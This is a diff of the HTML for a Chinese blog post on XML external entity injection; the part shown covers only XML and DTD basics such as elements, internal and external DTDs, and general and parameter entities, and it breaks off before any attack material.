@@ -18,12 +18,12 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="XML（可扩展标记语言） XML 的定义 XML（eXtensible Markup Language，扩展标记语言）是一种用于描述结构化数据的标记语言，它类似于 HTML，但它的标签是自定义的。XML 的主要目的是传输和存储数据，而不是显示数据。 XML 的语法 XML文档由元素、属性、文本、CDATA、注释、处理指令和实体组成。 基本结构： 12345&lt;?xml ver">
+        <meta name="description" content="XML（可扩展标记语言）XML 的定义XML（eXtensible Markup Language，扩展标记语言）是一种用于描述结构化数据的标记语言，它类似于 HTML，但它的标签是自定义的。XML 的主要目的是传输和存储数据，而不是显示数据。 XML 的语法XML文档由元素、属性、文本、CDATA、注释、处理指令和实体组成。 基本结构： 12345&lt;?xml version&#x3D;&quot;1">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XML 外部实体注入漏洞">
 <meta property="og:url" content="https://skyi23.github.io/2024/11/09/XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="sky123">
-<meta property="og:description" content="XML（可扩展标记语言） XML 的定义 XML（eXtensible Markup Language，扩展标记语言）是一种用于描述结构化数据的标记语言，它类似于 HTML，但它的标签是自定义的。XML 的主要目的是传输和存储数据，而不是显示数据。 XML 的语法 XML文档由元素、属性、文本、CDATA、注释、处理指令和实体组成。 基本结构： 12345&lt;?xml ver">
+<meta property="og:description" content="XML（可扩展标记语言）XML 的定义XML（eXtensible Markup Language，扩展标记语言）是一种用于描述结构化数据的标记语言，它类似于 HTML，但它的标签是自定义的。XML 的主要目的是传输和存储数据，而不是显示数据。 XML 的语法XML文档由元素、属性、文本、CDATA、注释、处理指令和实体组成。 基本结构： 12345&lt;?xml version&#x3D;&quot;1">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://skyi23.github.io/2024/11/09/XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/images/d5f4e3f357aad6fa7e1fbaee8ec645ab.png">
 <meta property="og:image" content="https://skyi23.github.io/2024/11/09/XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/images/7527adf8bc1eba7459bc42b5c1cb87a8.png">
@@ -420,322 +420,202 @@
 
 
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-			<h1 id="xml可扩展标记语言">XML（可扩展标记语言）</h1>
-<h2 id="xml-的定义">XML 的定义</h2>
-<p>XML（eXtensible Markup
-Language，扩展标记语言）是一种用于描述结构化数据的标记语言，它类似于
-HTML，但它的标签是自定义的。XML
-的主要目的是传输和存储数据，而不是显示数据。</p>
-<h2 id="xml-的语法">XML 的语法</h2>
-<p>XML文档由元素、属性、文本、CDATA、注释、处理指令和实体组成。</p>
+			<h1 id="XML（可扩展标记语言）"><a href="#XML（可扩展标记语言）" class="headerlink" title="XML（可扩展标记语言）"></a>XML（可扩展标记语言）</h1><h2 id="XML-的定义"><a href="#XML-的定义" class="headerlink" title="XML 的定义"></a>XML 的定义</h2><p>XML（eXtensible Markup Language，扩展标记语言）是一种用于描述结构化数据的标记语言，它类似于 HTML，但它的标签是自定义的。XML 的主要目的是传输和存储数据，而不是显示数据。</p>
+<h2 id="XML-的语法"><a href="#XML-的语法" class="headerlink" title="XML 的语法"></a>XML 的语法</h2><p>XML文档由元素、属性、文本、CDATA、注释、处理指令和实体组成。</p>
 <p><strong>基本结构</strong>：</p>
 <div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">element</span> <span class="attr">attribute</span>=<span class="string">&quot;value&quot;</span>&gt;</span>Text content<span class="tag">&lt;/<span class="name">element</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- This is a comment --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
 <p><strong>主要组件</strong>：</p>
 <ul>
-<li><strong>XML声明</strong>：定义XML版本和编码方式，如
-<code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;</code>。</li>
-<li><strong>元素</strong>：数据的基本单位，如
-<code>&lt;element&gt;Text content&lt;/element&gt;</code>。</li>
-<li><strong>属性</strong>：为元素提供附加信息，如
-<code>&lt;element attribute="value"&gt;</code>。</li>
-<li><strong>文本</strong>：元素包含的内容，如
-<code>Text content</code>。</li>
-<li><strong>注释</strong>：用于说明的注释文本，如
-<code>&lt;!-- This is a comment --&gt;</code>。</li>
+<li><strong>XML声明</strong>：定义XML版本和编码方式，如 <code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code>。</li>
+<li><strong>元素</strong>：数据的基本单位，如 <code>&lt;element&gt;Text content&lt;/element&gt;</code>。</li>
+<li><strong>属性</strong>：为元素提供附加信息，如 <code>&lt;element attribute=&quot;value&quot;&gt;</code>。</li>
+<li><strong>文本</strong>：元素包含的内容，如 <code>Text content</code>。</li>
+<li><strong>注释</strong>：用于说明的注释文本，如 <code>&lt;!-- This is a comment --&gt;</code>。</li>
 </ul>
-<h1 id="dtd文档类型定义">DTD（文档类型定义）</h1>
-<h2 id="dtd-的定义">DTD 的定义</h2>
-<p>DTD（Document Type Definition，文档类型定义）用于定义 XML
-文档的结构和合法元素。DTD 可以在 XML 文档内部定义，也可以引用外部 DTD
-文件。通过 DTD，可以定义元素、属性、实体和注释等。</p>
+<h1 id="DTD（文档类型定义）"><a href="#DTD（文档类型定义）" class="headerlink" title="DTD（文档类型定义）"></a>DTD（文档类型定义）</h1><h2 id="DTD-的定义"><a href="#DTD-的定义" class="headerlink" title="DTD 的定义"></a>DTD 的定义</h2><p>DTD（Document Type Definition，文档类型定义）用于定义 XML 文档的结构和合法元素。DTD 可以在 XML 文档内部定义，也可以引用外部 DTD 文件。通过 DTD，可以定义元素、属性、实体和注释等。</p>
 <p>DTD（文档类型定义）中主要包括以下几种类型的内容：</p>
 <ul>
-<li><strong>元素类型</strong>（Element
-Type）：用于定义元素及其内容模型。</li>
-<li><strong>属性列表类型</strong>（Attribute List
-Type）：用于定义元素的属性。</li>
-<li><strong>实体类型</strong>（Entity
-Type）：用于定义和重用文本片段。</li>
-<li><strong>符号声明</strong>（Notation Declaration）：用于定义非 XML
-数据类型。</li>
+<li><strong>元素类型</strong>（Element Type）：用于定义元素及其内容模型。</li>
+<li><strong>属性列表类型</strong>（Attribute List Type）：用于定义元素的属性。</li>
+<li><strong>实体类型</strong>（Entity Type）：用于定义和重用文本片段。</li>
+<li><strong>符号声明</strong>（Notation Declaration）：用于定义非 XML 数据类型。</li>
 </ul>
-<p>以下是一个综合示例，展示了如何在 DTD
-中使用元素声明、属性声明和实体声明。<strong>不过针对 XXE
-这里只需要关注「实体类型」即可。</strong></p>
+<p>以下是一个综合示例，展示了如何在 DTD 中使用元素声明、属性声明和实体声明。<strong>不过针对 XXE 这里只需要关注「实体类型」即可。</strong></p>
 <div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">bookstore</span> [</span></span><br><span class="line"><span class="meta">  &lt;!-- 元素声明 --&gt;</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">bookstore</span> (<span class="keyword">book</span>+)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">book</span> (<span class="keyword">title</span>, <span class="keyword">author</span>, <span class="keyword">publisher</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">title</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">author</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">publisher</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">  &lt;!-- 属性列表声明 --&gt;</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ATTLIST <span class="keyword">book</span></span></span></span><br><span class="line"><span class="meta"><span class="meta">      <span class="keyword">id</span> <span class="keyword">ID</span> <span class="keyword">#REQUIRED</span></span></span></span><br><span class="line"><span class="meta"><span class="meta">      <span class="keyword">category</span> <span class="keyword">CDATA</span> <span class="string">&quot;fiction&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">  &lt;!-- 内部实体声明 --&gt;</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">authorName</span> <span class="string">&quot;J.K. Rowling&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">  &lt;!-- 外部实体声明 --&gt;</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">logo</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://www.example.com/logo.png&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">  &lt;!-- 参数实体声明 --&gt;</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="keyword">bookElements</span> <span class="string">&quot;(title, author, publisher)&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">  &lt;!-- 符号声明 --&gt;</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!NOTATION <span class="keyword">gif</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;image/gif&quot;</span> <span class="string">&quot;http://www.example.com/gif&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bookstore</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">book</span> <span class="attr">id</span>=<span class="string">&quot;b1&quot;</span> <span class="attr">category</span>=<span class="string">&quot;fantasy&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Harry Potter<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;authorName;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">publisher</span>&gt;</span>Bloomsbury<span class="tag">&lt;/<span class="name">publisher</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bookstore</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
-<h2 id="dtd-在-xml-中的声明">DTD 在 XML 中的声明</h2>
-<p>在 XML
-文档中，可以通过<strong>内部</strong>和<strong>外部</strong>两种方式声明
-DTD。 <img   
+
+<h2 id="DTD-在-XML-中的声明"><a href="#DTD-在-XML-中的声明" class="headerlink" title="DTD 在 XML 中的声明"></a>DTD 在 XML 中的声明</h2><p>在 XML 文档中，可以通过<strong>内部</strong>和<strong>外部</strong>两种方式声明 DTD。<br><img   
                      lazyload
                      src="/images/loading.svg"
                      data-
                      lazyload
                      src="/images/loading.svg"
-                     data-src="images/d5f4e3f357aad6fa7e1fbaee8ec645ab.png"
+                     data-src="/2024/11/09/XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/images/d5f4e3f357aad6fa7e1fbaee8ec645ab.png"
                      
-                      
+                     
                 
                 ></p>
-<h3 id="内部-dtd-声明">内部 DTD 声明</h3>
-<p>内部 DTD 在 XML 文档的开头部分声明，包含在
-<code>&lt;!DOCTYPE&gt;</code> 声明中。内部 DTD 适用于较小的 XML
-文档，便于文档的自包含和管理。</p>
+<h3 id="内部-DTD-声明"><a href="#内部-DTD-声明" class="headerlink" title="内部 DTD 声明"></a>内部 DTD 声明</h3><p>内部 DTD 在 XML 文档的开头部分声明，包含在 <code>&lt;!DOCTYPE&gt;</code> 声明中。内部 DTD 适用于较小的 XML 文档，便于文档的自包含和管理。</p>
 <p>在 XML 中内部 DTD 声明格式如下：</p>
 <div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span></span><br></pre></td></tr></table></figure></div>
-<p>根据 XML 规范，<code>&lt;!DOCTYPE&gt;</code>
-声明中的根元素名称应与实际 XML
-文档的根元素名称一致。这样可以确保文档类型定义（DTD）能够正确地约束和验证
-XML 文档的结构。</p>
-<p>但在实际应用中，许多 XML
-解析器对这一点要求并不严格。在某些解析器中，即使
-<code>&lt;!DOCTYPE&gt;</code> 声明中的根元素名称与实际 XML
-文档的根元素名称不一致，解析器仍然会正常处理 XML
-文档。这种情况通常出现在宽松的解析器或非严格验证模式下。</p>
+
+<p>根据 XML 规范，<code>&lt;!DOCTYPE&gt;</code> 声明中的根元素名称应与实际 XML 文档的根元素名称一致。这样可以确保文档类型定义（DTD）能够正确地约束和验证 XML 文档的结构。</p>
+<p>但在实际应用中，许多 XML 解析器对这一点要求并不严格。在某些解析器中，即使 <code>&lt;!DOCTYPE&gt;</code> 声明中的根元素名称与实际 XML 文档的根元素名称不一致，解析器仍然会正常处理 XML 文档。这种情况通常出现在宽松的解析器或非严格验证模式下。</p>
 <p><strong>简而言之大多数情况下根元素可以随便起名。</strong></p>
 <p>下面是一个示例：</p>
 <div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
-<p>在上述示例中，内部 DTD 定义了 <code>note</code> 元素及其子元素
-<code>to</code>、<code>from</code>、<code>heading</code> 和
-<code>body</code>。每个子元素都是 PCDATA（Parsed Character
-Data），表示可以包含文本数据。</p>
-<h3 id="外部-dtd-声明">外部 DTD 声明</h3>
-<p>外部 DTD 存储在单独的文件中，可以在 XML
-文档中通过引用方式来使用。外部 DTD 适用于多个 XML 文档共享相同的 DTD
-定义，便于维护和更新。</p>
-<p>在 XML 中外部 DTD 声明格式如下（即内部 DTD 声明的
-<code>[元素声明]</code> 替换为 <code>SYSTEM "文件名"</code>）：</p>
+
+<p>在上述示例中，内部 DTD 定义了 <code>note</code> 元素及其子元素 <code>to</code>、<code>from</code>、<code>heading</code> 和 <code>body</code>。每个子元素都是 PCDATA（Parsed Character Data），表示可以包含文本数据。</p>
+<h3 id="外部-DTD-声明"><a href="#外部-DTD-声明" class="headerlink" title="外部 DTD 声明"></a>外部 DTD 声明</h3><p>外部 DTD 存储在单独的文件中，可以在 XML 文档中通过引用方式来使用。外部 DTD 适用于多个 XML 文档共享相同的 DTD 定义，便于维护和更新。</p>
+<p>在 XML 中外部 DTD 声明格式如下（即内部 DTD 声明的 <code>[元素声明]</code> 替换为 <code>SYSTEM &quot;文件名&quot;</code>）：</p>
 <div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 <span class="keyword">SYSTEM</span> <span class="string">&quot;文件名&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
 <p>下面是一个示例：</p>
 <p><strong>外部 DTD 文件：note.dtd</strong></p>
 <div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br></pre></td></tr></table></figure></div>
+
 <p><strong>XML 文档引用外部 DTD 文件</strong></p>
 <div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;note.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
-<p>在上述示例中，<code>&lt;!DOCTYPE note SYSTEM "note.dtd"&gt;</code>
-表示XML文档使用外部的 <code>note.dtd</code> 文件定义文档的结构。</p>
-<h2 id="dtd-实体的类型">DTD 实体的类型</h2>
-<p>DTD 实体是一种在 XML
-文档中定义和引用数据的机制。实体可以看作是文本的占位符或变量，它们允许在文档中定义一次并在多处使用。DTD
-实体主要用于简化文档的编写和维护，避免重复输入相同的文本或结构，确保数据的一致性。</p>
-<p>DTD
-实体分为<strong>普通实体</strong>和<strong>参数实体</strong>两种类型。每种类型又分为<strong>内部实体</strong>和<strong>外部实体</strong>两种。</p>
-<h3 id="普通实体">普通实体</h3>
-<p><strong>普通实体既可以在 XML 也可以在 DTD 中引用</strong>。</p>
+
+<p>在上述示例中，<code>&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</code> 表示XML文档使用外部的 <code>note.dtd</code> 文件定义文档的结构。</p>
+<h2 id="DTD-实体的类型"><a href="#DTD-实体的类型" class="headerlink" title="DTD 实体的类型"></a>DTD 实体的类型</h2><p>DTD 实体是一种在 XML 文档中定义和引用数据的机制。实体可以看作是文本的占位符或变量，它们允许在文档中定义一次并在多处使用。DTD 实体主要用于简化文档的编写和维护，避免重复输入相同的文本或结构，确保数据的一致性。</p>
+<p>DTD 实体分为<strong>普通实体</strong>和<strong>参数实体</strong>两种类型。每种类型又分为<strong>内部实体</strong>和<strong>外部实体</strong>两种。</p>
+<h3 id="普通实体"><a href="#普通实体" class="headerlink" title="普通实体"></a>普通实体</h3><p><strong>普通实体既可以在 XML 也可以在 DTD 中引用</strong>。</p>
 <ul>
-<li><p><strong>内部实体</strong>通过 <code>&lt;!ENTITY&gt;</code>
-声明，主要用于定义并直接替换的文本，格式如下：</p>
+<li><p><strong>内部实体</strong>通过 <code>&lt;!ENTITY&gt;</code> 声明，主要用于定义并直接替换的文本，格式如下：</p>
 <div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY 实体名称 <span class="string">&quot;实体的值&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
 <p>例如：</p>
-<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">author</span> <span class="string">&quot;John Doe&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li>
-<li><p><strong>外部实通</strong>过 <code>&lt;!ENTITY&gt;</code>
-声明，并使用 <code>SYSTEM</code> 关键字指定外部资源的
-URI。外部资源可以是文本文件、图像或其他数据，体格式如下：</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">author</span> <span class="string">&quot;John Doe&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p><strong>外部实通</strong>过 <code>&lt;!ENTITY&gt;</code> 声明，并使用 <code>SYSTEM</code> 关键字指定外部资源的 URI。外部资源可以是文本文件、图像或其他数据，体格式如下：</p>
 <div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY 实体名称 <span class="keyword">SYSTEM</span> <span class="string">&quot;URI&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
 <p>例如：</p>
 <div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">logo</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://www.example.com/logo.png&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li>
 </ul>
-<h3 id="参数实体">参数实体</h3>
-<p>参数实体是一种特殊的实体，用于在DTD中简化和重用定义。它具有以下特性：</p>
+<h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><p>参数实体是一种特殊的实体，用于在DTD中简化和重用定义。它具有以下特性：</p>
 <ul>
-<li><strong>参数实体只能在DTD中引用和使用</strong>：参数实体的定义和引用都必须在DTD中，不能在
-XML 文档的主体部分使用。它们用于简化 DTD 的定义，使 DTD
-更加模块化和可维护。</li>
-<li><strong>参数实体在本质上类似于编程语言中的宏定义</strong>：在 DTD
-中引用参数实体时，会将参数实体的值替换到引用的位置。这种替换机制使得 DTD
-更具灵活性和可重用性。</li>
-<li><strong>参数实体可以划分为内部实体和外部实体</strong>：内部实体是在
-DTD 中直接定义值的实体，而外部实体是通过 URI
-引用外部资源的实体。参数实体的唯一区别是它们的使用范围仅限于 DTD
-内部。</li>
+<li><strong>参数实体只能在DTD中引用和使用</strong>：参数实体的定义和引用都必须在DTD中，不能在 XML 文档的主体部分使用。它们用于简化 DTD 的定义，使 DTD 更加模块化和可维护。</li>
+<li><strong>参数实体在本质上类似于编程语言中的宏定义</strong>：在 DTD 中引用参数实体时，会将参数实体的值替换到引用的位置。这种替换机制使得 DTD 更具灵活性和可重用性。</li>
+<li><strong>参数实体可以划分为内部实体和外部实体</strong>：内部实体是在 DTD 中直接定义值的实体，而外部实体是通过 URI 引用外部资源的实体。参数实体的唯一区别是它们的使用范围仅限于 DTD 内部。</li>
 </ul>
-<p>参数实体可以是<strong>内部实体</strong>或<strong>外部实体</strong>，通过
-<code>%</code> 符号进行声明和引用（<strong>注意 %
-和实体名称之间要有空格</strong>），格式如下：</p>
+<p>参数实体可以是<strong>内部实体</strong>或<strong>外部实体</strong>，通过 <code>%</code> 符号进行声明和引用（<strong>注意 % 和实体名称之间要有空格</strong>），格式如下：</p>
 <div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % 实体名称 <span class="string">&quot;实体的值&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % 实体名称 <span class="keyword">SYSTEM</span> <span class="string">&quot;URI&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
 <p>例如：</p>
 <div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">part1</span> <span class="string">&quot;&lt;to&gt;John&lt;/to&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">part2</span> <span class="string">&quot;&lt;from&gt;Jane&lt;/from&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">part3</span> <span class="string">&quot;&lt;heading&gt;Meeting Reminder&lt;/heading&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">part4</span> <span class="string">&quot;&lt;body&gt;Don&#x27;t forget the meeting tomorrow!&lt;/body&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
-<h2 id="dtd-实体的引用">DTD 实体的引用</h2>
-<h3 id="特殊符号">特殊符号</h3>
-<p>在 XML 中，一些字符拥有特殊的意义，如果把这些直接放进 XML
-元素中会产生错误。为了避免这个错误，我们可以用实体引用来替代这些特殊的字符。比如在
-XML 中有 5 个预定义的实体引用：</p>
+
